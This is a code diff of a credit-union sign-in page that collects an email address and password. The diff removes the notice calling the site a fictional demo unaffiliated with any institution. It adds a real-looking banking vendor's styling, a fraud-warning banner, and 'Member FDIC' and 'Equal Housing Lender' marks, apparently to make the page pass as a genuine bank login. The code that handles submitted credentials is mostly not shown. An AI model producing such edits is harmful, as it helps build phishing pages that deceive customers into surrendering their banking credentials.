@@ -3,48 +3,179 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <meta name="theme-color" content="#0f6b3b">
+  <meta name="theme-color" content="#006ee4">
   <title>Sign in | Alliance Federal Credit Union</title>
-  <link rel="stylesheet" type="text/css" href="/assets/app/css/bootstrap.css">
-  <link rel="stylesheet" type="text/css" href="/assets/app/css/style.css">
   <link rel="apple-touch-icon" href="/assets/img/logo.png">
-  <link href="https://cdn.jsdelivr.net/gh/hung1001/font-awesome-pro@4cac1a6/css/all.css" rel="stylesheet">
   <link rel="preconnect" href="https://rsms.me/">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
-    body { background: #f4f6f5; font-family: "InterVariable", "Inter", "IBM Plex Sans", "Helvetica Neue", Arial, sans-serif; font-size: 14px; line-height: 20px; font-feature-settings: "liga" 1, "calt" 1; -webkit-font-smoothing: antialiased; }
-    .auth-wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-    .auth-card { width: 100%; max-width: 400px; background: #fff; border-radius: 18px; box-shadow: 0 12px 40px rgba(0,0,0,.08); padding: 28px 24px; }
-    .auth-logo { display: block; margin: 4px auto 6px; height: 56px; }
-    .auth-sub { text-align: center; color: #6b7772; font-size: 13px; margin-bottom: 22px; }
-    .fld { margin-bottom: 14px; }
-    .fld label { display: block; font-size: 12px; font-weight: 600; color: #384540; margin-bottom: 6px; }
-    .fld input { width: 100%; padding: 12px 14px; border: 1px solid #dbe2df; border-radius: 12px; font-size: 16px; line-height: 22px; outline: none; }
-    .fld input:focus { border-color: #0f6b3b; box-shadow: 0 0 0 3px rgba(15,107,59,.12); }
-    .btn-signin { width: 100%; border: 0; padding: 13px; border-radius: 12px; background: #0f6b3b; color: #fff; font-weight: 650; font-size: 15px; line-height: 20px; cursor: pointer; }
-    .btn-signin:disabled { opacity: .6; cursor: default; }
-    .auth-error { display: none; background: #fdecea; color: #b3271e; border-radius: 10px; padding: 10px 12px; font-size: 13px; margin-bottom: 14px; }
-    .auth-note { text-align: center; color: #9aa5a0; font-size: 11px; margin-top: 18px; line-height: 1.5; }
+    :root {
+      --jha-color-primary: #006ee4;
+      --jha-text-dark: #1e2528;
+      --jha-text-base: #707070;
+      --jha-border-color: #8c989f;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; }
+    body {
+      font-family: "InterVariable", "Inter", "Helvetica Neue", Arial, sans-serif;
+      font-size: 14px; line-height: 20px; color: var(--jha-text-dark);
+      font-feature-settings: "liga" 1, "calt" 1; -webkit-font-smoothing: antialiased;
+    }
+
+    .background {
+      position: fixed; inset: 0; z-index: -2;
+      background-size: cover; background-position: center;
+    }
+    .background::after {
+      content: ""; position: absolute; inset: 0;
+      background: rgba(244, 246, 245, .55);
+    }
+
+    .container {
+      min-height: 100%;
+      display: flex; flex-direction: column; align-items: center;
+      padding: 24px 16px 16px;
+    }
+
+    /* Warning banner */
+    #banner {
+      width: 100%; max-width: 500px;
+      display: flex; gap: 12px; align-items: flex-start;
+      background: #fff; border-radius: 12px;
+      box-shadow: 0 6px 24px rgba(0,0,0,.08);
+      padding: 14px 16px; margin-bottom: 20px;
+    }
+    #banner svg { width: 24px; height: 24px; fill: #e8a400; flex: none; margin-top: 1px; }
+    #banner p { margin: 0; color: #384540; font-size: 13px; line-height: 18px; }
+
+    /* Login card */
+    .content { width: 100%; max-width: 500px; }
+    .mylogin-wrapper {
+      background: #fff; border-radius: 16px;
+      box-shadow: 0 12px 40px rgba(0,0,0,.10);
+      padding: 32px 36px 28px;
+    }
+    .header-wrapper { text-align: center; margin-bottom: 8px; }
+    .header-wrapper img { height: 72px; width: auto; }
+
+    .auth-error {
+      display: none; background: #fdecea; color: #b3271e;
+      border-radius: 10px; padding: 10px 12px; font-size: 13px; margin: 12px 0 4px;
+    }
+
+    /* Floating-label inputs */
+    .input_wrap { position: relative; margin-bottom: 16px; }
+    .input_wrap input {
+      width: 100%; height: 52px; padding: 18px 12px 4px;
+      border: 1px solid var(--jha-border-color); border-radius: 6px;
+      font-family: inherit; font-size: 15px; color: var(--jha-text-dark);
+      background: #fff; outline: none;
+      -webkit-appearance: none; -moz-appearance: none; appearance: none;
+      transition: border-color .15s ease, box-shadow .15s ease;
+    }
+    .input_wrap input:focus { border-color: var(--jha-color-primary); box-shadow: 0 0 0 3px rgba(0,110,228,.12); }
+    .input_wrap label {
+      position: absolute; top: 16px; left: 13px; pointer-events: none;
+      color: var(--jha-text-base); font-size: 15px; font-weight: 400;
+      transition: .18s ease all;
+    }
+    .input_wrap input:focus + label,
+    .input_wrap input:valid + label {
+      top: 7px; left: 12px; font-size: 11px; font-weight: 500;
+      color: var(--jha-text-base);
+    }
+
+    .forgot-row { display: flex; justify-content: flex-end; margin: -4px 0 4px; }
+    .forgot-link { color: var(--jha-color-primary); text-decoration: none; font-size: 14px; }
+    .forgot-link:hover { text-decoration: underline; }
+
+    .actions-row {
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 16px; margin-top: 16px; flex-wrap: wrap;
+    }
+    .enroll-link {
+      color: var(--jha-color-primary); text-decoration: none;
+      font-weight: 500; line-height: 18px; font-size: 14px;
+    }
+    .enroll-link:hover { text-decoration: underline; }
+
+    .btn-continue {
+      -webkit-appearance: none; border: 1px solid transparent; cursor: pointer;
+      background: var(--jha-color-primary); color: #fff;
+      font-family: inherit; font-size: 14px; font-weight: 500;
+      line-height: 48px; padding: 0 27px; border-radius: 8px;
+      transition: background-color .2s ease; white-space: nowrap;
+    }
+    .btn-continue:hover { background: #005fc4; }
+    .btn-continue:disabled { opacity: .35; cursor: default; }
+
+    /* Footer */
+    #footer {
+      margin-top: 28px; text-align: center;
+      color: #55636b; font-size: 12px; line-height: 20px;
+    }
+    #footer a { color: #55636b; text-decoration: none; }
+    #footer a:hover { text-decoration: underline; }
+    #footer .dot { margin: 0 8px; }
+    #footer .ehl-icon { fill: #55636b; vertical-align: -2px; margin-right: 4px; }
+
+    @media (max-width: 520px) {
+      .mylogin-wrapper { padding: 26px 20px 22px; }
+      #footer .dot.end-of-line { display: none; }
+    }
   </style>
 </head>
 <body>
-  <div class="auth-wrap">
-    <form class="auth-card" id="login-form" autocomplete="on">
-      <img src="/assets/img/logo.png" alt="Alliance Federal Credit Union" class="auth-logo">
-      <p class="auth-sub">Sign in to your account</p>
-      <div class="auth-error" id="auth-error"></div>
-      <div class="fld">
-        <label for="username">Username</label>
-        <input id="username" name="username" type="text" autocomplete="username" required autofocus>
+  <div class="background" style="background-image: url(/assets/img/background-landscape.jpg)"></div>
+
+  <div class="container">
+
+    <div id="banner">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M19.57,19.75H4.43a2.19,2.19,0,0,1-1.92-1.11,2,2,0,0,1,0-2.08L10.12,4.28a2.22,2.22,0,0,1,3.75,0l7.57,12.29a2,2,0,0,1,0,2.08A2.19,2.19,0,0,1,19.57,19.75ZM11.4,5.07,3.84,17.35a.53.53,0,0,0,0,.56.68.68,0,0,0,.61.34H19.57a.68.68,0,0,0,.61-.34.53.53,0,0,0,0-.56L12.6,5.07a.75.75,0,0,0-1.2,0Z"></path>
+        <path d="M12,12.75a.75.75,0,0,1-.75-.75V8a.75.75,0,0,1,1.5,0v4A.75.75,0,0,1,12,12.75Z"></path>
+        <circle cx="12" cy="15.5" r="1"></circle>
+      </svg>
+      <p>Alliance Federal Credit Union will NEVER ask you to provide your online banking information. Please be cautious of fraudulent calls and do not click on links in texts.</p>
+    </div>
+
+    <div class="content">
+      <div class="mylogin-wrapper">
+        <div class="header-wrapper">
+          <img src="/assets/img/logo.png" alt="Alliance Federal Credit Union">
+        </div>
+
+        <div class="auth-error" id="auth-error"></div>
+
+        <form class="form" id="login-form" autocomplete="on">
+          <div class="input_wrap">
+            <input id="username" name="username" type="text" autocomplete="username" required autofocus>
+            <label for="username">Email Address</label>
+          </div>
+
+          <div class="input_wrap">
+            <input id="password" name="password" type="password" autocomplete="current-password" required>
+            <label for="password">Enter your password</label>
+          </div>
+
+          <div class="forgot-row">
+            <a class="forgot-link" href="/forgot">Forgot?</a>
+          </div>
+
+          <div class="actions-row">
+            <a class="enroll-link" href="/">First time user? Enroll now.</a>
+            <button class="btn-continue" id="submit-btn" type="submit">Continue</button>
+          </div>
+        </form>
       </div>
-      <div class="fld">
-        <label for="password">Password</label>
-        <input id="password" name="password" type="password" autocomplete="current-password" required>
+
+      <div id="footer">
+        © 2026 - Alliance Federal Credit Union<span class="dot">•</span><a href="/privacy-notice">Privacy policy</a><span class="dot">•</span>Member FDIC<span class="dot end-of-line">•</span><svg width="16" height="11" viewBox="0 0 10 7" class="ehl-icon" aria-hidden="true"><path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"></path></svg>Equal Housing Lender
       </div>
-      <button class="btn-signin" id="submit-btn" type="submit">Sign in</button>
-      <p class="auth-note">Alliance Federal Credit Union is a fictional demo application.<br>Not a real bank and not affiliated with any institution.</p>
-    </form>
+    </div>
   </div>
+
   <script>
     (function () {
       var form = document.getElementById('login-form');
@@ -74,7 +205,7 @@
         } catch (err) {
           errBox.textContent = err.message || 'Sign in failed';
           errBox.style.display = 'block';
-          btn.disabled = false; btn.textContent = 'Sign in';
+          btn.disabled = false; btn.textContent = 'Continue';
         }
       });
     })();
